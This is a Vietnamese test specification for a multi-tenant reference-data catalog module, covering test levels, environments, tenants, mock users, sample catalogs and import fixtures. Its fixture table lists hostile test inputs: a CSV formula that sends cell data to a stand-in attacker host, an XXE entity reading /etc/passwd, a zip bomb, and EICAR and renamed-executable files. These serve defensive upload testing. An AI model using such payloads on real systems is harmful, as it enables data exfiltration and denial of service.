---
ma_tai_lieu: D05-02-PH07
ten: Kịch bản và test case phân hệ PH-07 Danh mục dùng chung
phien_ban: 0.1
ngay: 2026-11-21
trang_thai: Dự thảo
nguoi_doc: Đội kiểm thử, Đội phát triển PH-07, Kiến trúc sư, ATTT, Cán bộ nghiệp vụ nghiệm thu, Chủ đầu tư
phan_he: PH-07
nguoi_lap: Nhóm phân hệ PH-07
---

# D05-02-PH07 · Kịch bản và test case phân hệ PH-07 Danh mục dùng chung

## 0. Giới thiệu

Tài liệu này là đặc tả kiểm thử (test specification) của phân hệ PH-07 Danh mục dùng chung (Reference Data Management, viết tắt RDM) thuộc sản phẩm Datahub, được lập theo cấu trúc tài liệu kiểm thử của ISO/IEC/IEEE 29119-3: đặc tả thiết kế kiểm thử (test design specification) thể hiện qua các kịch bản `TS-07-nn`, đặc tả ca kiểm thử (test case specification) thể hiện qua các test case `TC-07-nnn`, và đặc tả thủ tục kiểm thử (test procedure specification) thể hiện qua các bước thực hiện trong từng ca và mẫu mã tự động hóa ở mục 9. Kế hoạch kiểm thử tổng thể của Datahub (mức dự án) nằm ở D05-01; tài liệu này chỉ đi sâu vào PH-07 và kế thừa mọi quy định chung từ đó.

Mục tiêu của tài liệu là bảo đảm ba điều. Thứ nhất, mọi yêu cầu chức năng FR-07, quy tắc nghiệp vụ BR-07, mã lỗi ERR-07 và yêu cầu phi chức năng NFR-07 trong hợp đồng thiết kế của phân hệ đều có ít nhất một ca kiểm thử truy vết được, và mọi FR mức M có tối thiểu một ca dương tính và một ca âm tính theo quy tắc truy vết số 4 của [D00-01 §3.2](../../00-chung/D00-01-thuat-ngu-quy-uoc.md). Thứ hai, các rủi ro đặc thù của một hệ thống đa tenant cho 34 tỉnh, thành (rò rỉ dữ liệu chéo tenant, ghi nhầm vào danh mục toàn quốc, lẫn bộ đệm) được kiểm soát bằng kiểm thử bắt buộc theo [D03-10 §6](../../03-thiet-ke/D03-10-thiet-ke-da-tenant.md). Thứ ba, cán bộ nghiệp vụ đang dùng hệ thống Danh mục điện tử dùng chung cũ (hệ Aita) có bộ kịch bản nghiệm thu dễ hiểu để xác nhận hệ thống mới "không mất chức năng" so với hệ cũ, tương ứng các mục `LGC-DMDC-001…019` trong [D00-03](../../00-chung/D00-03-ma-tran-truy-vet.md).

Tài liệu dẫn chiếu các tài liệu PH-07 cùng bộ: [FRS](../../02-yeu-cau/frs/D02-03-PH07-frs-danh-muc.md), [Use case](../../02-yeu-cau/use-case/D02-04-PH07-use-case-danh-muc.md), [User story](../../02-yeu-cau/user-story/D02-05-PH07-user-story-danh-muc.md), [SDD](../../03-thiet-ke/sdd/D03-02-PH07-sdd-danh-muc.md), [CSDL](../../03-thiet-ke/csdl/D03-03-PH07-csdl-danh-muc.md), [API](../../03-thiet-ke/api/D03-04-PH07-api-danh-muc.md), [Màn hình](../../03-thiet-ke/uiux/D03-06-PH07-man-hinh-danh-muc.md); và các tài liệu nền: [D02-02 SRS](../../02-yeu-cau/D02-02-srs.md) (FR-00, NFR-00), [D02-07 Từ điển dữ liệu](../../02-yeu-cau/D02-07-tu-dien-du-lieu.md), [D02-08 Ma trận phân quyền](../../02-yeu-cau/D02-08-ma-tran-phan-quyen.md), [D03-01 SAD](../../03-thiet-ke/D03-01-sad.md), [D03-10 Thiết kế đa tenant](../../03-thiet-ke/D03-10-thiet-ke-da-tenant.md). Khi có mâu thuẫn về vai trò và quyền, D02-08 được ưu tiên; mọi kỳ vọng phân quyền trong tài liệu này đã được đối chiếu với D02-08 §3.1.

## 1. Phạm vi, chiến lược và tổ chức kiểm thử

### 1.1. Đối tượng kiểm thử

Đối tượng kiểm thử (test item) là module `rdm` thuộc đơn vị triển khai `dh-data` (Spring Boot 4, Java 21, Spring Modulith, package `vn.datahub.data.rdm`), bao gồm: lớp API REST tiền tố `/api/rdm/v1` (API-07-001…076) và API nền tảng `/api/platform/rdm/v1` (API-07-073); bộ xử lý nền nhập, xuất, đồng bộ; máy trạng thái phiên bản, danh mục, bản ghi, tác vụ nhập và lần đồng bộ; bộ dịch DSL truy vấn sang SQL tham số hóa; lớp bộ đệm hai tầng (Caffeine L1, Valkey L2); bộ sinh ảnh chụp (snapshot) lên kho đối tượng Garage; bảng `ph07_rdm.outbox` cùng luồng Debezium phát sự kiện CloudEvents lên Kafka; bộ di trú dữ liệu Aita; và các màn hình UI-07-01…13 trong ứng dụng `dh-console`. Ngoài ra, thư viện tra cứu ảnh chụp mà `dh-runtime` (Camel) dùng để tra danh mục trong data plane cũng là đối tượng kiểm thử ở mức tích hợp, vì nó là cơ chế đáp ứng NFR-07-010.

Ngoài phạm vi tài liệu này là: bản thân bộ điều hợp NDXP của PH-14 (chỉ được giả lập bằng WireMock), hộp "Việc của tôi" của nền tảng (chỉ kiểm tra rằng sự kiện EVT-07-04 được phát đúng), luồng xác thực Keycloak và chính sách APISIX chung (được kiểm thử ở D05-02 của PH-12 và PH-03); PH-07 chỉ kiểm tra hành vi của mình khi nhận token có vai trò, phạm vi và tenant xác định.

### 1.2. Mức kiểm thử

Kiểm thử PH-07 được tổ chức theo tám mức. Bảng dưới đây mô tả mục tiêu, phạm vi, công cụ và người chịu trách nhiệm của từng mức; mỗi test case ở mục 4 ghi rõ mức tự động hóa tương ứng ở trường "Tự động".

| Mức | Mục tiêu | Phạm vi chính | Công cụ | Chịu trách nhiệm | Khi chạy |
|---|---|---|---|---|---|
| Đơn vị (UT) | Kiểm tra logic thuần không phụ thuộc hạ tầng | Bộ kiểm tra hợp lệ theo lược đồ, bộ phân loại thay đổi phá vỡ, bộ tính khác biệt, bộ dịch DSL, bộ phân tích tệp (luồng), bộ chuẩn hóa mã T-CODE, thuật toán chuyển mã ĐVHC | JUnit 5, AssertJ, jqwik (kiểm thử theo thuộc tính), Mockito | Lập trình viên | Mỗi lần commit |
| Tích hợp (IT) | Kiểm tra tương tác với PostgreSQL 18 (RLS, jsonb, chỉ mục), Kafka, Valkey, Garage | Repository, RLS, outbox, Debezium, bộ đệm, kho đối tượng, Modulith event | JUnit 5, Testcontainers (PostgreSQL 18, Kafka KRaft, Valkey 8, MinIO thay Garage tương thích S3), Spring Modulith Test | Lập trình viên | Mỗi lần commit (pipeline CI) |
| Hệ thống/API (ST) | Kiểm tra API REST đầu cuối theo hợp đồng OpenAPI | Toàn bộ API-07, mã lỗi RFC 9457, phân quyền, đa tenant | REST Assured, Spring MockMvc (tầng web), Schemathesis (kiểm thử hợp đồng theo OpenAPI) | Kỹ sư kiểm thử | Mỗi lần hợp nhất vào nhánh chính; hằng đêm trên SIT |
| Giao diện E2E | Kiểm tra luồng người dùng trên `dh-console` | UI-07-01…13 | Playwright (Chromium, Firefox, WebKit), dữ liệu mồi qua API | Kỹ sư kiểm thử | Hằng đêm trên SIT |
| Phi chức năng (NFT) | Kiểm tra hiệu năng, chịu tải, khả dụng | NFR-07-001…015 | k6, Grafana/Prometheus, Chaos Mesh | Kỹ sư hiệu năng | Hằng tuần trên môi trường PERF; trước mỗi bản phát hành |
| Bảo mật (SEC) | Kiểm tra kiểm soát truy cập, tải tệp, injection | OWASP ASVS 5.0 các chương V4, V5, V8, V12, V13 | OWASP ZAP (quét chủ động có xác thực), REST Assured, bộ tệp độc hại tự sinh | Kỹ sư ATTT | Hằng tuần; trước phát hành |
| Di trú (MIG) | Kiểm tra chuyển dữ liệu Aita sang mô hình mới | FR-07-051, FR-00-090…092 | JUnit 5 + Testcontainers MySQL 8 (giả lập CSDL Aita) và PostgreSQL 18, kịch bản đối chiếu SQL | Lập trình viên di trú, kỹ sư kiểm thử | Mỗi lần thay đổi bộ di trú; diễn tập trước chuyển đổi |
| Nghiệm thu (UAT) | Cán bộ nghiệp vụ xác nhận tương đương chức năng hệ cũ và đáp ứng nghiệp vụ mới | Mục 7 | Thủ công trên môi trường UAT, biểu mẫu ghi kết quả | Cán bộ nghiệp vụ của tỉnh thí điểm, đội kiểm thử hỗ trợ | Trước nghiệm thu giai đoạn |

Kiểm thử khả năng truy cập (accessibility) được lồng vào mức giao diện E2E bằng axe-core (tự động) và thực hiện thủ công với bàn phím và trình đọc màn hình NVDA cho ba luồng chính (mục 6.4).

### 1.3. Môi trường kiểm thử

PH-07 dùng ba loại môi trường. Môi trường cục bộ và CI dựng hạ tầng bằng Testcontainers để mỗi lần chạy có dữ liệu sạch và cô lập; môi trường SIT (System Integration Test) có đủ các thành phần nền tảng thật; môi trường PERF có cấu hình gần giống sản xuất để đo NFR.

| Môi trường | Thành phần | Ghi chú |
|---|---|---|
| CI (Testcontainers) | PostgreSQL 18 (ảnh chính thức, bật `wal_level=logical`), Kafka KRaft 3 nút đơn, Debezium Connect (khi kiểm thử outbox đầu cuối), Valkey 8, MinIO (tương thích API S3 của Garage), WireMock (giả lập PH-14) | Schema `ph07_rdm` được Liquibase tạo khi khởi động; vai trò kết nối ứng dụng `dh_data_app` không có `BYPASSRLS` và không sở hữu bảng (để RLS có hiệu lực thật) |
| SIT | Keycloak (realm `t68`, `t01`, `platform` có người dùng giả lập ở mục 2.2), APISIX (định tuyến, giới hạn tần suất, xác thực JWT), OPA, `dh-data` 2 bản sao, `dh-runtime` 1 bản sao, Kafka 3 broker, Debezium, Valkey, Garage, PH-13 kiểm toán, PH-14 thật nhưng bộ điều hợp NDXP trỏ tới WireMock giả lập dịch vụ DMDC quốc gia | Dữ liệu được nạp lại mỗi đêm từ bộ dữ liệu chuẩn mục 2 |
| PERF | Như SIT; `dh-data` 3 bản sao (giới hạn 2 GB/pod), PostgreSQL 18 chính + 1 bản sao đọc, Valkey 3 nút, Grafana/Prometheus/Tempo | Dữ liệu quy mô NFR-07-011: 1.000 danh mục × 34 tenant, danh mục lớn 200.000 bản ghi |
| UAT | Như SIT, dữ liệu là bản di trú từ bản sao CSDL Aita đã ẩn danh của tỉnh thí điểm | Chỉ cán bộ nghiệp vụ và đội kiểm thử truy cập |

WireMock giả lập NDXP cung cấp bốn nhóm điểm cuối tương ứng bốn chức năng kết nối DMDC quốc gia (danh sách danh mục, cấu trúc danh mục, lấy dữ liệu, đề xuất bổ sung) qua PH-14. Bộ kịch bản WireMock (scenario) có các trạng thái `BASE`, `ADDED_5`, `RENAMED_2`, `REMOVED_1`, `ATTR_TYPE_CHANGED`, `HTTP_500`, `TIMEOUT` để điều khiển nội dung trả về theo từng test case đồng bộ (mục 2.6).

### 1.4. Công cụ

| Công cụ | Dùng cho | Ghi chú |
|---|---|---|
| JUnit 5 + AssertJ | Kiểm thử đơn vị, tích hợp | Thẻ `@Tag("tenant-leak")`, `@Tag("security")`, `@Tag("migration")` để lọc nhóm |
| Testcontainers | Hạ tầng tạm cho IT | Dùng `@ServiceConnection` của Spring Boot; chia sẻ container theo lớp cơ sở `RdmIntegrationTestBase` |
| REST Assured / Spring MockMvc | Kiểm thử API | Token giả lập ký bằng khóa thử (JWT có `tenant`, `realm_access.roles`, `org_id`, `scope`) ở CI; token thật từ Keycloak ở SIT |
| Schemathesis | Kiểm thử hợp đồng OpenAPI `openapi-rdm.yaml` | Phát hiện phản hồi sai lược đồ, mã HTTP ngoài khai báo |
| Playwright | E2E giao diện | Chạy trên ba trình duyệt; ghi hình khi lỗi |
| axe-core (`@axe-core/playwright`) | Khả năng truy cập tự động | Tiêu chí WCAG 2.1 mức AA |
| NVDA + Firefox | Khả năng truy cập thủ công | Ba luồng chính ở mục 6.4 |
| k6 | Tải, chịu tải, thời lượng | Xuất chỉ số sang Prometheus remote write |
| Chaos Mesh | Kiểm thử hỗn loạn | Dừng PostgreSQL, Valkey, cắt mạng tới Garage |
| OWASP ZAP | Quét bảo mật động | Chạy với ngữ cảnh xác thực của từng vai trò |
| WireMock | Giả lập NDXP qua PH-14 | Kịch bản có trạng thái |

### 1.5. Tiêu chí vào và ra

Tiêu chí vào (entry criteria) cho một đợt kiểm thử hệ thống PH-07 gồm: bản dựng đã qua toàn bộ kiểm thử đơn vị và tích hợp trên CI; độ phủ mã dòng của module `rdm` đạt tối thiểu 80% và độ phủ nhánh của bộ dịch DSL, bộ phân loại thay đổi phá vỡ, bộ chuyển mã ĐVHC đạt tối thiểu 90%; tài liệu OpenAPI `openapi-rdm.yaml` khớp mã (kiểm tra tự động); môi trường SIT đã nạp bộ dữ liệu chuẩn và vượt kiểm tra khói (smoke test) gồm TC-07-001, TC-07-121, TC-07-122.

Tiêu chí ra (exit criteria) để PH-07 được coi là đạt mức hệ thống gồm: 100% test case ưu tiên P1 đạt; tối thiểu 95% test case P2 đạt và các ca không đạt còn lại không thuộc nhóm bảo mật, đa tenant hay toàn vẹn dữ liệu; 100% ca thẻ `tenant-leak` đạt (FR-00-011 yêu cầu 100%); không còn lỗi mức Nghiêm trọng (Critical) hoặc Cao (High) chưa đóng; mọi NFR-07-001…010 đạt ngưỡng trong hai lần đo liên tiếp; quét ZAP không có cảnh báo mức Cao; axe-core không có vi phạm mức "serious" hoặc "critical" trên UI-07-01, 05, 06, 07; ma trận truy vết mục 8 đạt 100% với FR mức M, BR, ERR.

Tiêu chí tạm dừng (suspension criteria): dừng đợt kiểm thử khi phát hiện bất kỳ ca rò rỉ chéo tenant nào không đạt, hoặc khi hơn 20% ca khói thất bại; tiếp tục khi lỗi được sửa và ca khói đạt lại.

### 1.6. Quy ước mã và cách trình bày

Kịch bản kiểm thử có mã `TS-07-nn` (hai chữ số, từ 01). Test case có mã `TC-07-nnn` (ba chữ số, từ 001), không tái sử dụng khi bị hủy (ghi "Đã hủy" và giữ mã, theo D00-01 §3.1). Mỗi test case thuộc đúng một kịch bản: kịch bản là mục cấp 3 chứa test case đó trong mục 4. Mỗi test case được trình bày thành một khối có cấu trúc thống nhất như sau.

- Dòng tiêu đề: mã, tên ca.
- **Loại**: Dương (positive), Âm (negative), Biên (boundary), Bảo mật, Hiệu năng, Khả dụng (availability), Truy cập (accessibility). **Ưu tiên**: P1 (chặn phát hành), P2 (quan trọng), P3 (bổ sung). **Tự động**: tầng tự động hóa (UT, IT, API, E2E, k6, Chaos, ZAP) hoặc "Thủ công".
- **Truy vết**: FR, BR, API, UI, ERR, EVT, UC liên quan.
- **Tiền điều kiện / dữ liệu**: trạng thái hệ thống trước khi chạy và dữ liệu dùng, tham chiếu mã dữ liệu ở mục 2.
- **Bước**: các bước đánh số, nêu lệnh API (phương thức, đường dẫn rút gọn sau `/api/rdm/v1`, thân yêu cầu quan trọng) hoặc thao tác giao diện.
- **Mong đợi**: mã HTTP, mã lỗi ERR-07 (nếu có), trạng thái dữ liệu sau, sự kiện EVT được phát hay không, bản ghi kiểm toán.

Trong phần mong đợi dùng các quy ước rút gọn sau. "403-PQ" là phản hồi `403` lỗi phân quyền chung của nền tảng (định dạng RFC 9457, mã lỗi chung ERR-00 theo D03-04; PH-07 không cấp mã riêng cho lỗi thiếu quyền). "404-ẩn" là phản hồi `404` dùng khi truy cập tài nguyên của tenant khác, không phân biệt với tài nguyên không tồn tại (D03-10 §6 quy tắc 6). "KT: có (hành động)" là có bản ghi kiểm toán gửi PH-13 với hành động tương ứng, đủ trường theo FR-00-041; "KT: không" là không được sinh bản ghi kiểm toán nghiệp vụ (thao tác đọc thường, hoặc thao tác bị từ chối trước khi chạm dữ liệu, trường hợp này chỉ có nhật ký an ninh). "EVT: không" là sau 10 giây không có bản ghi mới nào trong `ph07_rdm.outbox` và không có thông điệp trên topic liên quan. Mọi đường dẫn API trong bước là tương đối với tiền tố `/api/rdm/v1` trừ khi ghi đầy đủ.

### 1.7. Quản lý lỗi và báo cáo

Lỗi phát hiện được ghi vào hệ thống quản lý lỗi với nhãn `PH-07`, mã test case, mức nghiêm trọng và `trace_id` của lời gọi lỗi. Lỗi rò rỉ chéo tenant, ghi được vào danh mục COMMON từ tenant tỉnh, hoặc mất tính bất biến của phiên bản đã phát hành luôn được xếp mức Nghiêm trọng. Báo cáo tiến độ kiểm thử được sinh tự động hằng đêm từ kết quả JUnit/Playwright/k6 và đối chiếu với ma trận truy vết mục 8.

## 2. Dữ liệu kiểm thử

### 2.1. Tenant

Bộ dữ liệu chuẩn dùng bốn tenant. Hai tenant tỉnh `T68` và `T01` giúp phát hiện rò rỉ chéo tenant; tenant `PLATFORM` là nơi người quản trị nền tảng làm việc và là tenant duy nhất ghi được danh mục COMMON; `COMMON` là tenant logic chứa dữ liệu toàn quốc, không có người dùng đăng nhập.

| Mã tenant | Ý nghĩa trong kiểm thử | Realm Keycloak | Ghi chú |
|---|---|---|---|
| `T68` | Tỉnh chính để kiểm thử nghiệp vụ (Lâm Đồng, giả lập) | `t68` | Có đầy đủ người dùng mọi vai trò, hai tổ chức chủ quản |
| `T01` | Tỉnh đối chứng để kiểm thử rò rỉ | `t01` | Có danh mục trùng mã với T68 (`LOAI_HINH_TC`) nhưng nội dung khác để phát hiện trả nhầm |
| `PLATFORM` | Quản trị nền tảng | `platform` | Ghi danh mục COMMON, gọi API nạp gói nền |
| `COMMON` | Dữ liệu toàn quốc | không có | Chứa `GIOI_TINH`, `DAN_TOC`, `QUOC_TICH`, `DVHC` |

### 2.2. Người dùng và ứng dụng giả lập

Người dùng giả lập được đặt tên theo mẫu `{tenant}-{vai trò}[-{tổ chức}]`, không chứa dữ liệu cá nhân thật. Vai trò dùng đúng mã của D02-08. Tổ chức chủ quản giả lập trong T68 là `ORG-STNMT` (Sở Tài nguyên và Môi trường, giả lập) và `ORG-SNV` (Sở Nội vụ, giả lập), có định danh `owner_org_id` cố định trong bộ dữ liệu.

| Mã dữ liệu | Tenant | Vai trò (D02-08) | Tổ chức | Mục đích |
|---|---|---|---|---|
| U-PA | PLATFORM | ROLE-PLATFORM_ADMIN | — | Ghi COMMON, nạp gói nền |
| U-PO | PLATFORM | ROLE-PLATFORM_OPERATOR | — | Kiểm tra chỉ đọc |
| U-T68-TA | T68 | ROLE-TENANT_ADMIN | — | Toàn quyền tenant trừ duyệt/phát hành |
| U-T68-DS-NV | T68 | ROLE-DATA_STEWARD | ORG-SNV | Soạn danh mục của Sở Nội vụ |
| U-T68-DS-MT | T68 | ROLE-DATA_STEWARD | ORG-STNMT | Kiểm tra phạm vi ○ (không sửa danh mục của ORG-SNV) |
| U-T68-DA1 | T68 | ROLE-DATA_APPROVER | — | Người duyệt thứ nhất |
| U-T68-DA2 | T68 | ROLE-DATA_APPROVER + ROLE-DATA_STEWARD | ORG-SNV | Người vừa soạn vừa duyệt, dùng kiểm thử bốn mắt |
| U-T68-IE | T68 | ROLE-INTEGRATION_ENGINEER | — | Đọc, xuất, ánh xạ (đề xuất) |
| U-T68-VW | T68 | ROLE-VIEWER | — | Chỉ đọc, xuất |
| U-T68-AU | T68 | ROLE-AUDITOR | — | Đọc lịch sử kiểm toán |
| U-T68-DEV | T68 | ROLE-DEVELOPER | — | Cổng nhà phát triển, thử API |
| U-T68-SV | T68 | ROLE-SERVICE_OWNER | ORG-SNV | Vai trò không liên quan PH-07, chỉ có `PERM-07-read`, `PERM-07-export` |
| U-T01-TA | T01 | ROLE-TENANT_ADMIN | — | Đối chứng rò rỉ |
| U-T01-DS | T01 | ROLE-DATA_STEWARD | ORG-T01-SNV | Đối chứng rò rỉ |
| U-T01-DA | T01 | ROLE-DATA_APPROVER | — | Đối chứng rò rỉ |
| APP-T68-READ | T68 | client OAuth2, scope `rdm.read` | HTTT `HT-HOTICH` (giả lập) | Tra cứu |
| APP-T68-QUERY | T68 | scope `rdm.read rdm.query` | HTTT `HT-DATDAI` | Truy vấn có cấu trúc |
| APP-T68-WRITE | T68 | scope `rdm.write` | HTTT `HT-NOIVU` | Nhập lô vào bản nháp |
| APP-T68-NOSCOPE | T68 | không có scope rdm | HTTT `HT-KHAC` | Kiểm thử âm scope |
| APP-T01-READ | T01 | scope `rdm.read` | HTTT `HT-T01` | Đối chứng rò rỉ |

Mọi người dùng có vai trò hậu tố `_ADMIN` hoặc vai trò duyệt đều đã đăng ký yếu tố xác thực thứ hai giả lập (TOTP với khóa thử) trong realm SIT để không vướng FR-00-002 khi chạy tự động.

### 2.3. Danh mục mẫu

Bộ danh mục mẫu được thiết kế để mỗi đặc tính quan trọng của mô hình (phẳng hay phân cấp, LOCAL hay NATIONAL hay HYBRID, COMMON hay tenant, có hay không cần duyệt, RESTRICTED) đều có ít nhất một đại diện. Bảng sau liệt kê các danh mục, tenant sở hữu và đặc điểm.

| Mã dữ liệu | Mã danh mục | Tenant | Nguồn | Phân cấp | Đặc điểm |
|---|---|---|---|---|---|
| CAT-GT | `GIOI_TINH` | COMMON | NATIONAL | Không | 3 bản ghi `1` Nam, `2` Nữ, `3` Chưa xác định; 2 phiên bản đã phát hành (v1 hiệu lực từ 2020-01-01 tới 2025-01-01, v2 từ 2025-01-01); có nguồn đồng bộ `SRC-GT` |
| CAT-DT | `DAN_TOC` | COMMON | NATIONAL | Không | 54 bản ghi mã `01`…`54` và `55` "Người nước ngoài"; thuộc tính `ten_khac` STRING searchable |
| CAT-DT68 | `DAN_TOC_T68` | T68 | HYBRID | Không | `extends_catalog_id` trỏ `DAN_TOC`; `local_code_pattern` = `^68\.[0-9]{2}$`; 2 bản ghi bổ sung `68.01` "Nhóm Chu Ru địa phương (giả lập)", `68.02` |
| CAT-LH | `LOAI_HINH_TC` | T68 | LOCAL | 3 cấp, `max_depth` = 3, `level_names` = `["Khối","Loại","Phân loại"]` | 3 khối, 9 loại, 27 phân loại (39 bản ghi); thuộc tính `viet_tat` STRING(20) queryable, `cap_quan_ly` ENUM {`TINH`,`XA`} queryable, `ngay_thanh_lap` DATE, `so_bien_che` INTEGER (không queryable), `website` URI; `owner_org_id` = ORG-SNV; `require_approval = true` |
| CAT-LH01 | `LOAI_HINH_TC` | T01 | LOCAL | 3 cấp | Cùng mã với CAT-LH nhưng tên bản ghi có hậu tố "(T01)" để phát hiện trả nhầm tenant |
| CAT-MUC | `MUC_DO_DVC` | T68 | LOCAL | Không | 4 bản ghi; `require_approval = false` (cho phép phát hành trực tiếp); `owner_org_id` = ORG-SNV |
| CAT-NHAP | `DM_THU_NGHIEM` | T68 | LOCAL | Không | Trạng thái `DRAFT`, chưa từng phát hành; dùng kiểm thử xóa danh mục |
| CAT-RES | `TRAM_QUAN_TRAC` | T68 | LOCAL | Không | `classification = RESTRICTED`; 50 bản ghi; cấp quyền khai thác cho `HT-DATDAI` nhưng không cho `HT-HOTICH` |
| CAT-REF | `LINH_VUC_TTHC` | T68 | LOCAL | Không | Có thuộc tính `loai_hinh` kiểu CATALOG_REF trỏ `LOAI_HINH_TC`; dùng kiểm thử BR-07-020 |
| CAT-BIG | `DM_LON_100K` | T68 | LOCAL | 2 cấp | 100.000 bản ghi sinh tự động, 20 thuộc tính trong đó 5 queryable; dùng hiệu năng và DSL |
| CAT-DVHC | `DVHC` | COMMON | LOCAL (PLATFORM quản) | 3 cấp lịch sử, 2 cấp hiện hành | Mục 2.4 |

### 2.4. Danh mục ĐVHC giả lập có lịch sử sắp xếp

Để kiểm thử chuyển mã ĐVHC mà không phụ thuộc vào dữ liệu thật (vốn cần đối chiếu Công báo), bộ dữ liệu dùng một vùng mã giả lập `97`, `98`, `99` cho cấp tỉnh và `99xxx` cho cấp xã. Các mã này được ghi rõ là giả lập, chỉ tồn tại trong môi trường kiểm thử và không phản ánh mã thật trong Quyết định 19/2025/QĐ-TTg. Song song, bộ dữ liệu cũng nạp bản chính thức của danh mục ĐVHC (34 tỉnh, 3.321 xã) để kiểm thử đếm số lượng và hiệu năng; bản chính thức không dùng trong các ca kiểm thử logic chuyển mã.

Lịch sử giả lập gồm ba phiên bản đã phát hành. Bảng dưới đây tóm tắt từng phiên bản và các sự kiện sắp xếp (`item_succession`) được ghi nhận khi phát hành.

| Phiên bản | Hiệu lực | Cấp | Bản ghi chính | Sự kiện sắp xếp ghi nhận |
|---|---|---|---|---|
| v1 | 2020-01-01 tới 2025-07-01 | Tỉnh, Huyện, Xã | Tỉnh `97` "Tỉnh Giả lập A", `98` "Tỉnh Giả lập B"; huyện `971`, `972` (thuộc 97), `981` (thuộc 98); xã `99001`, `99002` (thuộc 971), `99003` (thuộc 972), `99004`, `99005` (thuộc 981) | — |
| v2 | 2025-07-01 tới 2026-01-01 | Tỉnh, Xã | Tỉnh `97` "Tỉnh Giả lập AB"; xã `99101`, `99102`, `99103`, `99004` "Phường Giả lập Mới", `99105` (đều thuộc 97) | `MERGE` 97+98 → 97 (đổi tên); `ABOLISH` 971, 972, 981; `MERGE` 99001+99002 → 99101; `SPLIT` 99003 → 99102, 99103; `RENAME` 99004 → 99004; `RECODE` 99005 → 99105. Căn cứ: "Nghị quyết giả lập số 01/2025" |
| v3 | từ 2026-01-01 | Tỉnh, Xã | `99101` đổi tên; `99201` mới; `99103`, `99105` ngừng dùng | `RENAME` 99101 → 99101; `MERGE` 99103+99105 → 99201. Căn cứ: "Nghị quyết giả lập số 02/2025" |

Từ dữ liệu này có các chuỗi chuyển mã điển hình dùng trong kịch bản TS-07-17: `99001` tại 2026-06-01 cho `99101` (một bước); `99005` tại 2026-06-01 cho `99201` (hai bước RECODE rồi MERGE); `99003` tại 2025-08-01 cho `AMBIGUOUS` với ứng viên `99102`, `99103`; `99003` tại 2026-06-01 cho `AMBIGUOUS` với ứng viên `99102`, `99201`; `99004` tại 2024-06-01 cho chính nó với tên cũ; tra ngược `99201` về thời điểm 2024-06-01 cho tập `{99003 (một phần), 99005}`.

### 2.5. Tệp nhập mẫu

Tệp nhập mẫu được sinh bằng công cụ `rdm-testdata-gen` (mô-đun Java trong `apps/data/src/test/tools`, dùng Apache POI SXSSF cho xlsx và Commons CSV cho csv) với hạt giống ngẫu nhiên cố định để tái lập. Tệp nhỏ được lưu trong kho mã tại `src/test/resources/rdm/import/`; tệp lớn (100.000 dòng, bom nén) được sinh trong bước chuẩn bị của pipeline để không phình kho mã. Mã kiểm tra SHA-256 của từng tệp được ghi trong `manifest.json` để phát hiện thay đổi ngoài ý muốn.

| Mã dữ liệu | Tệp | Nội dung | Cách sinh | Dùng ở |
|---|---|---|---|---|
| F-OK10 | `lh_ok_10.xlsx` | Khuôn chuẩn, 10 dòng hợp lệ cho `LOAI_HINH_TC`: 3 sửa tên bản ghi đã có, 7 bản ghi mới cấp 3 | Sinh theo lược đồ CAT-LH | TS-07-08 |
| F-OK10-CSV | `lh_ok_10.csv` | Như F-OK10, CSV UTF-8 có BOM | Như trên | TS-07-08 |
| F-NOBOM | `lh_ok_10_nobom.csv` | Như F-OK10-CSV nhưng UTF-8 không BOM, có ký tự tiếng Việt dựng sẵn và tổ hợp (NFD) | Ghi byte trực tiếp, tên chứa "Phường Đông Hòa" dạng NFD | TS-07-09 |
| F-100K | `big_100k.xlsx` | 100.000 dòng hợp lệ cho `DM_LON_100K`, 20 cột thuộc tính, khoảng 18 MB | SXSSF, hạt giống 42 | TS-07-08, NFR-07-005 |
| F-200K1 | `big_200001.csv` | 200.001 dòng (vượt giới hạn 1 dòng) | Commons CSV | TS-07-09 |
| F-51MB | `big_51mb.csv` | 51 MB, dưới giới hạn số dòng | Đệm cột `ghi_chu` dài | TS-07-09 |
| F-ERR | `lh_err.xlsx` | 12 dòng: dòng 3 sai kiểu `ngay_thanh_lap` = "31/02/2024"; dòng 4 `cap_quan_ly` = "HUYEN" ngoài miền; dòng 5 trùng mã với dòng 6 khác hoa thường (`kh01.l01` và `KH01.L01`); dòng 7 `MA_CHA` không tồn tại; dòng 8 và 9 tạo vòng (A cha B, B cha A); dòng 10 sâu cấp 4; dòng 11 thiếu `TEN`; các dòng còn lại hợp lệ | Sinh có chủ đích | TS-07-08 |
| F-REPL | `lh_replace.xlsx` | 30 bản ghi: thiếu 9 bản ghi đã phát hành và 2 bản ghi mới chỉ có trong nháp so với bản nháp hiện tại | Sinh từ CAT-LH | TS-07-08 |
| F-AITA-X | `aita_legacy.xlsx` | Khuôn Aita: ô A2 "Danh mục nghề nghiệp (giả lập)", dòng 4 từ ô B4 là tên thuộc tính ("Mã nghề", "Tên nghề", "Ghi chú"), từ dòng 5 là 25 bản ghi, cột A là số thứ tự | Sinh theo HDSD Aita mục 4.3 | TS-07-09 |
| F-AITA-U16 | `aita_legacy_utf16le.csv` | Khuôn Aita dạng CSV UTF-16 LE có BOM, phân cách tab như tệp xuất từ Excel "Unicode Text" | Ghi byte `FF FE` | TS-07-09 |
| F-AITA-U16BE | `aita_legacy_utf16be.csv` | Như trên, UTF-16 BE có BOM `FE FF` | | TS-07-09 |
| F-AITA-B4 | `aita_empty_b4.xlsx` | Khuôn Aita có ô C4 trống (tên thuộc tính trống) | | TS-07-09 |
| F-FAKE | `virus_rename.xlsx` | Tệp thực thi PE đổi đuôi `.xlsx` | Sao chép tệp mẫu EICAR bọc trong PE giả | TS-07-09, TS-07-28 |
| F-EICAR | `eicar.csv` | Chuỗi kiểm thử EICAR trong một ô CSV | Chuỗi chuẩn EICAR | TS-07-28 |
| F-ZIPBOMB | `bomb.xlsx` | xlsx có `sheet1.xml` nén tỉ lệ > 1:1000 (giải nén khoảng 5 GB) | Tạo XML lặp, nén deflate mức 9 | TS-07-09, TS-07-28 |
| F-XXE | `xxe.xlsx` | xlsx có `sharedStrings.xml` chứa khai báo thực thể ngoài trỏ `file:///etc/passwd` | Sửa XML thủ công | TS-07-28 |
| F-FORMULA | `formula.csv` | Ô `TEN` chứa `=HYPERLINK("http://attacker.invalid/?x="&A1,"Bấm")`, ô khác bắt đầu `+`, `-`, `@`, ký tự tab và CR đầu ô | Ghi trực tiếp | TS-07-09, TS-07-28 |
| F-MISSCOL | `missing_ten.csv` | Thiếu cột `TEN` | | TS-07-09 |
| F-LONG | `long_values.xlsx` | Giá trị `TEN` 2.000 ký tự; giá trị thuộc tính vượt `max_length` | | TS-07-08 |
